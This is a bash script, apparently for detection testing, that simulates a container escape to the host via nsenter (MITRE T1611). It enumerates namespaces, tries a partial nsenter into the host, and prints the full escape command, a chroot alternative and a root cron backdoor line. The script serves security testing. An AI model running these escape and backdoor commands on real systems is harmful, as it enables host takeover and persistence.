#!/bin/bash
# Attack: Namespace Escape via nsenter
# MITRE ATT&CK: Privilege Escalation - T1611
# Severity: HIGH
# Description: Uses nsenter to break out of container namespaces and access host namespaces
# Prerequisites: nsenter must be available, host PID namespace access

set -e
echo "[+] Starting: Namespace Escape via nsenter"
echo "[+] MITRE ATT&CK: T1611 - Escape to Host"
echo "[+] Severity: HIGH"
echo ""

echo "[*] Step 1: Checking for nsenter utility..."
if command -v nsenter &> /dev/null; then
    echo "[+] nsenter is available"
    nsenter --version 2>/dev/null || echo "[*] nsenter present but version check failed"
else
    echo "[!] nsenter not found"
    echo "[!] In real attack, attacker would install nsenter or use static binary"
fi

echo ""
echo "[*] Step 2: Checking namespace configuration..."
echo "[*] Current namespaces:"
ls -la /proc/self/ns/

echo ""
echo "[*] Comparing with PID 1 namespaces:"
if [ -d /proc/1/ns ]; then
    echo "[*] PID 1 namespaces:"
    ls -la /proc/1/ns/ | head -5

    echo ""
    echo "[*] Namespace comparison:"
    for ns in ipc mnt net pid uts; do
        SELF_NS=$(readlink /proc/self/ns/$ns 2>/dev/null || echo "unknown")
        PID1_NS=$(readlink /proc/1/ns/$ns 2>/dev/null || echo "unknown")

        if [ "$SELF_NS" = "$PID1_NS" ]; then
            echo "    $ns: [SAME] - Already in host namespace!"
        else
            echo "    $ns: [DIFFERENT] - Isolated from host"
        fi
    done
else
    echo "[!] Cannot access /proc/1/ns - not in host PID namespace"
fi

echo ""
echo "[*] Step 3: nsenter escape technique..."
echo "[*] Basic nsenter command to enter all host namespaces:"
echo ""
echo "    nsenter -t 1 -m -u -n -i -p /bin/bash"
echo ""
echo "[*] Explanation:"
echo "    -t 1     : Target PID 1 (host init/systemd)"
echo "    -m       : Enter mount namespace"
echo "    -u       : Enter UTS namespace (hostname)"
echo "    -n       : Enter network namespace"
echo "    -i       : Enter IPC namespace"
echo "    -p       : Enter PID namespace"

echo ""
echo "[*] Step 4: Checking host PID namespace access..."
if [ -r /proc/1/root ]; then
    echo "[+] Can access /proc/1/root - host filesystem accessible!"
    echo "[*] Host root filesystem:"
    ls -la /proc/1/root/ 2>/dev/null | head -10
else
    echo "[!] Cannot access /proc/1/root"
fi

echo ""
echo "[*] Step 5: Testing partial namespace escape..."
if command -v nsenter &> /dev/null; then
    echo "[*] Attempting to read host hostname via nsenter:"
    if nsenter -t 1 -u hostname 2>/dev/null; then
        echo "[+] Successfully executed command in host UTS namespace!"
    else
        echo "[!] nsenter failed - may lack permissions"
    fi
fi

echo ""
echo "[*] Step 6: Alternative escape - using /proc/1/root..."
echo "[*] If nsenter fails, can access host filesystem directly:"
echo ""
echo "    chroot /proc/1/root /bin/bash"
echo ""
echo "[*] This provides host filesystem access without nsenter"

echo ""
echo "[*] Step 7: Demonstrating host process visibility..."
echo "[*] Processes visible from container:"
ps aux | wc -l
echo "[*] Total processes visible: $(ps aux | wc -l)"

if [ $(ps aux | wc -l) -gt 20 ]; then
    echo "[+] Many processes visible - likely in host PID namespace!"
else
    echo "[!] Few processes visible - in isolated PID namespace"
fi

echo ""
echo "[*] Step 8: Full escape scenario..."
echo "[*] Complete escape sequence:"
echo ""
echo "    # Enter host namespaces"
echo "    nsenter -t 1 -m -u -n -i -p /bin/bash"
echo ""
echo "    # Now executing as host root:"
echo "    hostname  # Host hostname, not container"
echo "    ps aux    # All host processes"
echo "    ip addr   # Host network interfaces"
echo ""
echo "    # Install backdoor on host"
echo "    echo '* * * * * /tmp/backdoor.sh' > /var/spool/cron/root"
echo ""
echo "    # Access host Docker socket"
echo "    docker ps  # All containers on host"

echo ""
echo "[✓] Namespace escape simulation completed"
echo "[i] In a real attack, this would:"
echo "    - Break out of container namespaces"
echo "    - Access host filesystem"
echo "    - See all host processes"
echo "    - Access host network"
echo "    - Execute commands as host root"
echo "    - Install persistent backdoors"
echo ""
echo "[!] Expected detections:"
echo "    - nsenter execution from container"
echo "    - Access to host namespaces"
echo "    - Commands executed in host context"
echo "    - Host filesystem modifications"
